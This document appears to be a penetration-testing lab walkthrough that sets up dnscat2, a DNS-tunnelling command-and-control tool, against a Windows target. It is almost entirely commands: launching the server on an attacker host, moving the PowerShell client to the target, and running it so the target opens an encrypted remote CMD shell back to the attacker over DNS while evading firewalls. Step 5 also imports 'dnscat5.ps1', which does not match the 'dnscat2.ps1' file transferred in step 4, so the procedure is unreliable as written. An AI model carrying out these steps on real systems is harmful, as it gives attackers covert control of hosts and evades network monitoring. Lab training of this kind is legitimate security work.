### Overview

**Dnscat2** is a command-and-control (C2) tool that uses the **DNS protocol** to tunnel encrypted data between a compromised internal host and an external attack server. It transmits data through **TXT records**, often bypassing firewalls and network monitoring tools.

---

### Environment Setup

|   |   |   |   |
|---|---|---|---|
|Role|Hostname|IP Address|Description|
|Attacker Machine|attacker|10.10.14.18|Runs dnscat2 server (UDP 53)|
|Target Machine|win-target|Internal IP|Runs dnscat2 PowerShell client|
|Domain Used|-|-|inlanefreight.local (for fake DNS tunneling)|

---

## 1. On the **Attacker Machine** – Clone and Set Up dnscat2 Server

```Shell
# Clone dnscat2 server repository
git clone https://github.com/iagox86/dnscat2.git

# Navigate into server directory
cd dnscat2/server/

# Install required dependencies
sudo gem install bundler
sudo bundle install
```

---

## 2. On the **Attacker Machine** – Start dnscat2 Server

```Shell
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

- **host**: IP of the attacker machine
- **port**: DNS port (53)
- **domain**: Domain used for encoding data

**Note:** Upon launch, a **PreSharedSecret** will be displayed. You’ll use this secret on the client.

---

## 3. On the **Attacker Machine** – Clone the PowerShell Client

```Shell
git clone <https://github.com/lukebaggett/dnscat2-powershell.git>
```

---

## 4. Transfer dnscat2.ps1 to the **Target Machine**

Use your preferred method (SCP, SMB, or HTTP server) to copy `dnscat2.ps1` to the Windows host.

---

## 5. On the **Target Machine (Windows)** – Import the PowerShell Client

```PowerShell
Import-Module ./dnscat5.ps1
```

---

## 6. On the **Target Machine** – Establish Encrypted DNS Tunnel

```PowerShell
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret <SECRET> -Exec cmd
```

- **DNSserver**: Attacker IP (10.10.14.18)
- **Domain**: Tunnel domain (inlanefreight.local)
- **PreSharedSecret**: The secret generated when starting the server
- **Exec cmd**: Sends an interactive CMD shell

---

## 7. On the **Attacker Machine** – Confirm Connection

```Plain
Session 1 Security: ENCRYPTED AND VERIFIED!
dnscat2>
```

---

## 8. On the **Attacker Machine** – Interact with the Session

```Plain
dnscat2> window -i 1
```

You will now enter an interactive CMD session with the target Windows host.

---

## 9. On the **Attacker Machine** – List dnscat2 Commands (Optional)

```Plain
dnscat2> ?
```

Provides available options such as `start`, `kill`, `set`, `stop`, `window`, etc.

---

## Summary

- Launch **dnscat2 server** on the **attacker machine** (Linux)
- Transfer and run **dnscat2 PowerShell client** on the **target Windows host**
- Authenticate with a **PreSharedSecret** to establish an **encrypted DNS tunnel**
- Use `dnscat2` terminal to interact with the shell and issue commands securely